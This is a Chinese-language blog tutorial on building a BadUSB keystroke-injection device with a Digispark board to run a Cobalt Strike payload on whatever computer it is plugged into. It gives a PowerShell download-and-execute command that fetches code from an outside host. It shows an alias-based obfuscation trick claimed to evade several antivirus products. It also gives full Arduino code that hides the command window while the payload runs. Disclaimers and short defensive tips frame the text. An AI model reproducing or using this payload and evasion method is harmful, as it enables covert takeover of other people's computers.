***严正声明：本文仅限于技术讨论与分享，严禁用于非法途径。**

>
> 声明：该文章来自作者日常学习笔记，也有少部分文章是经过原作者授权后转载，未经授权，严禁转载，如需转载，联系开白。请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者无关

 **近源渗透分类**

> 1，wifi渗透（在上一篇文章）
>
> 2，HID攻击
>
> 3，社会工程学

上一篇文章大体学习了wifi渗透的一些常用手段

这篇文章主要聊一聊HID攻击

## 什么是hId攻击

说这个之前先介绍一下什么是单片机。

单片机是是采用超大规模集成电路技术把中央处理器CPU、随机存储器RAM、只读存储器ROM、多种I/O口和中断系统、等元件集成到一块硅片上构成的一个小而完善的微型计算机系统。

简言之单片机就是一种集成电路芯片，并且单片机是可以直接进行烧录的

hld（人体学接口设备），指的是能够为计算机提供输入输出供人机交互的设备，如 鼠标，键盘，U盘等

hId攻击：攻击者将事先准备好的hId设备往其中烧录对应平台payload，因为所有的hLd设备大部分都是以单片机的形式制作，并且单片机是跨平台的，但是其中的payload不同平台有不同平台的，需要根据环境进行更改。

当受害者将其插入自己的电脑后，该hid设备将模拟成键盘，其中的payload会立马执行，以此完成控制目标的功能。

本文的HID设备就是badusb

## badusb的制作到免杀CS上线

###  **准备阶段**

1，badusb单片机

淘宝购买

2，Arduino

Arduino开发板是对单片机等电子元件的一种烧录工具

3，CS

CobaltStrike，团队作战神器

### 正式开始

 **1，下载arduino开发板**

[
https://downloads.arduino.cc/arduino-1.8.13-windows.exe](https://downloads.arduino.cc/arduino-1.8.13-windows.exe)

安装步骤傻瓜式安装，会需要安装驱动程序

 **2，安装完成之后出现如下界面**

![](https://image.3001.net/images/20210801/1627827420_6106acdcabae7748d24e7.png!small)

setup写入的是要执行的代码

loop写入的代码会被循环执行

 **3，选择开发板**

 **简单说一下这里会踩坑，我也是研究了一段时间才明白的**

arduino支持对多种开发板类型进行烧录，这里在烧录时要注意你选择的单片机是什么类型的，并且不同类型的烧录方式也有点不同

arduino leonardo这个是网上很多教程选择的开发板，烧录过程就是插入单片机选择好开发板，再选择leonardo的端口即可烧录

而我选择的是digital的单片机，当时找了半天端口都没有找到，最后才发现这种类型的单片机不需要选择对应的端口。。。并且还有一个坑，下面再将。

leonardo和digispark两个板子的区别我也没有发现，都能够模拟USB设备，好像是digispark更适合入门，性价比更高一点

A，安装digispark的驱动程序

驱动：[https://share.weiyun.com/GQfyigzn](https://share.weiyun.com/GQfyigzn)

64位的电脑就选择64的

![](https://image.3001.net/images/20210801/1627827991_6106af17a3cd5861e6d24.png!small)

B，安装完成后，先打开设备管理器，再插入badusb，此时会看到出现如下图的设备就证明成功了，但是几秒后会立马消失或者设备变成未识别的设备，这是正常的

 **为什么会消失**
，请教某位大佬给的解答是，这几秒是进行引导程序的，引导程序时，计算机会通过usb接口与设备进行通信，此时可以识别到设备，但是当引导完成后，将会加载单片机中录入的程序，此时加载过程以及之后的过程就不会被计算机识别到

![](https://image.3001.net/images/20210801/1627828007_6106af273e12ba2651a5c.png!small)

C，驱动程序安装完成以后，需要在Arduino中安装开发版，因为Digispark开发板默认是不存在的

文件----首选项----填入对应的开发板网址（[http://digistump.com/package_digistump_index.json](http://digistump.com/package_digistump_index.json)）

![](https://image.3001.net/images/20210801/1627828024_6106af38c1314ef2d2408.png!small)

之后安装开发版，选择工具----开发板-----开发板管理器

将会打开如下图，等待更新完成后，选择贡献-----Digistump图中红框的开发板包 进行安装，等待几分钟安装完成即可

![](https://image.3001.net/images/20210801/1627828061_6106af5d715533fdc1ab4.png!small)

D，安装完成后，选择这里的Digispark开发板

此时都准备完成了，下一步就是将payload烧录进单片机中了

![](https://image.3001.net/images/20210801/1627828082_6106af72b678c599dd10f.png!small)

 **4，免杀制作**

 **上线CS**

有文件落地的动作太大，这里选择无文件落地的

![](https://image.3001.net/images/20210801/1627828098_6106af8265df6a402b13e.png!small)

直接生成的pwoershell上线，会被杀掉

    
    
    powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.52.23:80/a'))"

此条命令的是通过download下载恶意powershell，之后通过IEX在后台隐藏执行

IEX（Invoke-expression），作用是将字符串当成powershell命令执行，并且是加载到内存中执行，不会有文件落地

 **免杀**

一般常用的免杀绕过方式都是通过字符串混淆，或者是编码混淆，以及拆分变量字符转义等方式

此处通过echo配合管道符 ‘|’ 达到免杀效果

    
    
    echo set-alias -name rookie -value Invoke-Expression;rookie(new-object net.webclient).downloadstring('http://192.xxx.xxx.xxx:91/a') | powershell

echo在powershell中的作用是格式化输出，于是echo后面的内容都会被原封不动的输出，之后经过管道符追加到powershell 中执行

附powershell百宝箱：[https://docs.microsoft.com/zh-cn/search/?scope=PowerShell](https://docs.microsoft.com/zh-cn/search/?scope=PowerShell)

![](https://image.3001.net/images/20210801/1627828175_6106afcf5f5d8433adfa0.png!small)

并且此处通过set-alias，将Invoke-Expression进行一个变量重命名处理，以防止对iex命令的检测

到此免杀准备完成，经过测试腾讯电脑管家，360，火绒都是可以过的

![](https://image.3001.net/images/20210801/1627828188_6106afdc44a9a1ad39ff7.png!small)

 **5，准备好要烧录的代码**

注：由于各个开发板的按键语法都有些差异，导致过程就很繁琐

找到一个大佬的转换脚本：[https://github.com/Catboy96/Automator/](https://github.com/Catboy96/Automator/)

要烧录的代码如下：

    
    
    #include "DigiKeyboard.h"
    void setup() {
      // put your setup code here, to run once:
      DigiKeyboard.delay(2000);//为等待2秒
      DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);//发送win+R
      DigiKeyboard.delay(800);
      DigiKeyboard.println("cmd /T:01 /K mode CON: COLS=16 LINES=1");//将cmd窗口最小化保证隐蔽性
      DigiKeyboard.delay(2000);
      DigiKeyboard.println("echo set-alias -name rookie -value Invoke-Expression;rookie(new-object net.webclient).downloadstring('http://192.119.92.116:91/a') | powershell -");//要执行的payload
      DigiKeyboard.delay(3500);
      DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);//执行完成后alt+F4关闭窗口
    }
    
    void loop() {
      // put your main code here, to run repeatedly:
    
    }

可以看到这是基于C写的，本来想补充的完善一点可是发现一些键根本找不到啊！！！

解释一下为啥每条命令后面都需要等待时间，这是为了给处理器足够的时间进行响应，如果太短，后面的命令将都不会执行或者执行出错。

6，选择箭头指向的上传烧录按钮，之后下面会出现两行红色代码，就是要在60S内把badusb插入，必须在这时候插入，之前插入都不可以，这也是这个开发板的弊端了

![](https://image.3001.net/images/20210801/1627828372_6106b094e9ed5a18b1546.png!small)

插入后就会自动上传烧录代码：

![](https://image.3001.net/images/20210801/1627828390_6106b0a6310bff011a804.png!small)

 **7.完成后将会自动执行**

真的是插谁谁上线啊

到此基本完成了

## 总结

其实还是有些不完美之处。插入后让它静默执行，这样效果会更好，并且将执行的代码进行加密等等这些还都是要继续学习的地方

并且这里吐槽一下digispark的开发板，不太好用啊。需要按驱动，并且烧录的过程就有点麻烦，还有它的语法不如leonardo的普及度广，好多东西都查不到。早知道我就选择leonardo的了，所以板子一定要选好啊，中间好几次绝望想放弃，辛亏坚持下来了哈哈

补充一点，单片机的烧录次数不是无限制的，一般都是取决于ROM（程序存储器）的类型决定，大部分可以烧录几K次应当没问题

 **此实验是在安全封闭环境下的测试，请勿非法测试，要遵守法律，做良好公民。**

##  **关于此类攻击的防护建议：**

1，不随便将移动设备插入办公电脑

2，不将不可信设备直接插入电脑中

3，谨慎与陌生人的交谈，防止被钓鱼

